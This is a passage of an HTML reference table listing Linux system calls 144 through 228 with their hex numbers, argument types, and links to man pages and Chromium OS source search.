cmd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">144</td><td>msync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msync">cs/</a></td><td align="center">0x90</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">145</td><td>readv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readv">cs/</a></td><td align="center">0x91</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">146</td><td>writev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/writev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*writev">cs/</a></td><td align="center">0x92</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">147</td><td>getsid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsid">cs/</a></td><td align="center">0x93</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">148</td><td>fdatasync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fdatasync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fdatasync">cs/</a></td><td align="center">0x94</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">149</td><td>_sysctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/_sysctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*_sysctl">cs/</a></td><td align="center">0x95</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">150</td><td>mlock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlock">cs/</a></td><td align="center">0x96</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">151</td><td>munlock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munlock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munlock">cs/</a></td><td align="center">0x97</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">152</td><td>mlockall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlockall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlockall">cs/</a></td><td align="center">0x98</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">153</td><td>munlockall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munlockall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munlockall">cs/</a></td><td align="center">0x99</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">154</td><td>sched_setparam</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setparam.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setparam">cs/</a></td><td align="center">0x9a</td><td>pid_t pid</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">155</td><td>sched_getparam</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getparam.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getparam">cs/</a></td><td align="center">0x9b</td><td>pid_t pid</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">156</td><td>sched_setscheduler</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setscheduler.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setscheduler">cs/</a></td><td align="center">0x9c</td><td>pid_t pid</td><td>int policy</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">157</td><td>sched_getscheduler</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getscheduler.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getscheduler">cs/</a></td><td align="center">0x9d</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">158</td><td>sched_yield</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_yield.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_yield">cs/</a></td><td align="center">0x9e</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">159</td><td>sched_get_priority_max</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_get_priority_max.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_get_priority_max">cs/</a></td><td align="center">0x9f</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">160</td><td>sched_get_priority_min</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_get_priority_min.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_get_priority_min">cs/</a></td><td align="center">0xa0</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">161</td><td>sched_rr_get_interval</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_rr_get_interval.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_rr_get_interval">cs/</a></td><td align="center">0xa1</td><td>pid_t pid</td><td>struct __kernel_timespec *interval</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">162</td><td>nanosleep</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/nanosleep.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nanosleep">cs/</a></td><td align="center">0xa2</td><td>struct __kernel_timespec *rqtp</td><td>struct __kernel_timespec *rmtp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">163</td><td>mremap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mremap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mremap">cs/</a></td><td align="center">0xa3</td><td>unsigned long addr</td><td>unsigned long old_len</td><td>unsigned long new_len</td><td>unsigned long flags</td><td>unsigned long new_addr</td><td>-</td></tr><tr><td align="center">164</td><td>setresuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresuid">cs/</a></td><td align="center">0xa4</td><td>uid_t ruid</td><td>uid_t euid</td><td>uid_t suid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">165</td><td>getresuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresuid">cs/</a></td><td align="center">0xa5</td><td>uid_t *ruid</td><td>uid_t *euid</td><td>uid_t *suid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">166</td><td>vm86</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vm86.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vm86">cs/</a></td><td align="center">0xa6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">167</td><td>query_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/query_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*query_module">cs/</a></td><td align="center">0xa7</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">168</td><td>poll</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/poll.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*poll">cs/</a></td><td align="center">0xa8</td><td>struct pollfd *ufds</td><td>unsigned int nfds</td><td>int timeout</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">169</td><td>nfsservctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/nfsservctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nfsservctl">cs/</a></td><td align="center">0xa9</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">170</td><td>setresgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresgid">cs/</a></td><td align="center">0xaa</td><td>gid_t rgid</td><td>gid_t egid</td><td>gid_t sgid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">171</td><td>getresgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresgid">cs/</a></td><td align="center">0xab</td><td>gid_t *rgid</td><td>gid_t *egid</td><td>gid_t *sgid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">172</td><td>prctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/prctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prctl">cs/</a></td><td align="center">0xac</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td></tr><tr><td align="center">173</td><td>rt_sigreturn</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigreturn.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigreturn">cs/</a></td><td align="center">0xad</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">174</td><td>rt_sigaction</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigaction.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigaction">cs/</a></td><td align="center">0xae</td><td>int</td><td>const struct sigaction *</td><td>struct sigaction *</td><td>size_t</td><td>-</td><td>-</td></tr><tr><td align="center">175</td><td>rt_sigprocmask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigprocmask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigprocmask">cs/</a></td><td align="center">0xaf</td><td>int how</td><td>sigset_t *set</td><td>sigset_t *oset</td><td>size_t sigsetsize</td><td>-</td><td>-</td></tr><tr><td align="center">176</td><td>rt_sigpending</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigpending.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigpending">cs/</a></td><td align="center">0xb0</td><td>sigset_t *set</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">177</td><td>rt_sigtimedwait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigtimedwait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigtimedwait">cs/</a></td><td align="center">0xb1</td><td>const sigset_t *uthese</td><td>siginfo_t *uinfo</td><td>const struct __kernel_timespec *uts</td><td>size_t sigsetsize</td><td>-</td><td>-</td></tr><tr><td align="center">178</td><td>rt_sigqueueinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigqueueinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigqueueinfo">cs/</a></td><td align="center">0xb2</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">179</td><td>rt_sigsuspend</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigsuspend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigsuspend">cs/</a></td><td align="center">0xb3</td><td>sigset_t *unewset</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">180</td><td>pread64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pread64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pread64">cs/</a></td><td align="center">0xb4</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td></tr><tr><td align="center">181</td><td>pwrite64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwrite64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwrite64">cs/</a></td><td align="center">0xb5</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td></tr><tr><td align="center">182</td><td>chown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chown">cs/</a></td><td align="center">0xb6</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">183</td><td>getcwd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getcwd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getcwd">cs/</a></td><td align="center">0xb7</td><td>char *buf</td><td>unsigned long size</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">184</td><td>capget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/capget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*capget">cs/</a></td><td align="center">0xb8</td><td>cap_user_header_t header</td><td>cap_user_data_t dataptr</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">185</td><td>capset</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/capset.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*capset">cs/</a></td><td align="center">0xb9</td><td>cap_user_header_t header</td><td>const cap_user_data_t data</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">186</td><td>sigaltstack</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigaltstack.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigaltstack">cs/</a></td><td align="center">0xba</td><td>const struct sigaltstack *uss</td><td>struct sigaltstack *uoss</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">187</td><td>sendfile</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendfile.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendfile">cs/</a></td><td align="center">0xbb</td><td>int out_fd</td><td>int in_fd</td><td>off_t *offset</td><td>size_t count</td><td>-</td><td>-</td></tr><tr><td align="center">188</td><td>getpmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpmsg">cs/</a></td><td align="center">0xbc</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">189</td><td>putpmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/putpmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*putpmsg">cs/</a></td><td align="center">0xbd</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">190</td><td>vfork</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vfork.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vfork">cs/</a></td><td align="center">0xbe</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">191</td><td>ugetrlimit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ugetrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ugetrlimit">cs/</a></td><td align="center">0xbf</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">192</td><td>mmap2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mmap2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mmap2">cs/</a></td><td align="center">0xc0</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">193</td><td>truncate64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/truncate64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*truncate64">cs/</a></td><td align="center">0xc1</td><td>const char *path</td><td>loff_t length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">194</td><td>ftruncate64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ftruncate64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ftruncate64">cs/</a></td><td align="center">0xc2</td><td>unsigned int fd</td><td>loff_t length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">195</td><td>stat64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/stat64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*stat64">cs/</a></td><td align="center">0xc3</td><td>const char *filename</td><td>struct stat64 *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">196</td><td>lstat64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lstat64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lstat64">cs/</a></td><td align="center">0xc4</td><td>const char *filename</td><td>struct stat64 *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">197</td><td>fstat64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstat64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstat64">cs/</a></td><td align="center">0xc5</td><td>unsigned long fd</td><td>struct stat64 *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">198</td><td>lchown32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lchown32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lchown32">cs/</a></td><td align="center">0xc6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">199</td><td>getuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getuid32">cs/</a></td><td align="center">0xc7</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">200</td><td>getgid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgid32">cs/</a></td><td align="center">0xc8</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">201</td><td>geteuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/geteuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*geteuid32">cs/</a></td><td align="center">0xc9</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">202</td><td>getegid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getegid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getegid32">cs/</a></td><td align="center">0xca</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">203</td><td>setreuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setreuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setreuid32">cs/</a></td><td align="center">0xcb</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">204</td><td>setregid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setregid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setregid32">cs/</a></td><td align="center">0xcc</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">205</td><td>getgroups32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgroups32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgroups32">cs/</a></td><td align="center">0xcd</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">206</td><td>setgroups32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgroups32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgroups32">cs/</a></td><td align="center">0xce</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">207</td><td>fchown32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchown32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchown32">cs/</a></td><td align="center">0xcf</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">208</td><td>setresuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresuid32">cs/</a></td><td align="center">0xd0</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">209</td><td>getresuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresuid32">cs/</a></td><td align="center">0xd1</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">210</td><td>setresgid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresgid32">cs/</a></td><td align="center">0xd2</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">211</td><td>getresgid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresgid32">cs/</a></td><td align="center">0xd3</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">212</td><td>chown32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chown32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chown32">cs/</a></td><td align="center">0xd4</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">213</td><td>setuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setuid32">cs/</a></td><td align="center">0xd5</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">214</td><td>setgid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgid32">cs/</a></td><td align="center">0xd6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">215</td><td>setfsuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsuid32">cs/</a></td><td align="center">0xd7</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">216</td><td>setfsgid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsgid32">cs/</a></td><td align="center">0xd8</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">217</td><td>pivot_root</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pivot_root.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pivot_root">cs/</a></td><td align="center">0xd9</td><td>const char *new_root</td><td>const char *put_old</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">218</td><td>mincore</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mincore.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mincore">cs/</a></td><td align="center">0xda</td><td>unsigned long start</td><td>size_t len</td><td>unsigned char * vec</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">219</td><td>madvise</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/madvise.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*madvise">cs/</a></td><td align="center">0xdb</td><td>unsigned long start</td><td>size_t len</td><td>int behavior</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">220</td><td>getdents64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getdents64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getdents64">cs/</a></td><td align="center">0xdc</td><td>unsigned int fd</td><td>struct linux_dirent64 *dirent</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">221</td><td>fcntl64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fcntl64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fcntl64">cs/</a></td><td align="center">0xdd</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">222</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xde</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">223</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xdf</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">224</td><td>gettid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/gettid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gettid">cs/</a></td><td align="center">0xe0</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">225</td><td>readahead</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readahead.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readahead">cs/</a></td><td align="center">0xe1</td><td>int fd</td><td>loff_t offset</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">226</td><td>setxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setxattr">cs/</a></td><td align="center">0xe2</td><td>const char *path</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">227</td><td>lsetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lsetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lsetxattr">cs/</a></td><td align="center">0xe3</td><td>const char *path</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">228</td><td>fsetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fsetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fsetxattr">cs/</a></td><td align="center">0xe4</td><td>int fd</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td 